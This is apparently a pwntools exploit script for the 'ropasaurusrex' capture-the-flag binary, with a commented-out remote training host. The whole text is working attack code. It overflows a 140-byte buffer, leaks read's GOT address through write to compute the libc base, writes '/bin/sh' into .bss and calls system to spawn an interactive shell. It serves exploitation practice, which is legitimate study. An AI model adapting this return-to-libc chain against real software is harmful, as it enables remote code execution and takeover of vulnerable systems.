from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
p = process("./ropasaurusrex")
#p = remote("training.jinblack.it", 2014)
gdb.attach(p, '''''')
#f = elf.ELF('./ropasaurusrex')
libc = elf.ELF('./libc-2.27.so')
#libc = elf.ELF("/lib/x86_64-linux-gnu/libc.so.6")

writeAddress = 0x0804830c
readGot = 0x0804961c
mainAddress = 0x08048340
pop3 = 0x080484b6

raw_input("Wait")

payload = "A"*140
payload += p32(writeAddress)
payload += p32(pop3)
payload += p32(1) + p32(readGot) + p32(4)
payload += p32(mainAddress)

p.send(payload)
time.sleep(0.1)

read_libc = u32(p.recv(4))
libc_base = read_libc - libc.symbols['read']
system_libc = libc_base + libc.symbols['system']
#bssAddress = 0x08049628
bssAddress = 0x0804962c

cmd ="/bin/sh\x00"
payload = "A"*140
payload += p32(read_libc)
payload += p32(pop3)
payload += p32(0) + p32(bssAddress) + p32(len(cmd))
payload += p32(system_libc)
payload += "AAAA"#i have to leve a spot for the retur address
payload += p32(bssAddress)

p.send(payload)
time.sleep(0.1)
p.send(cmd)

p.interactive()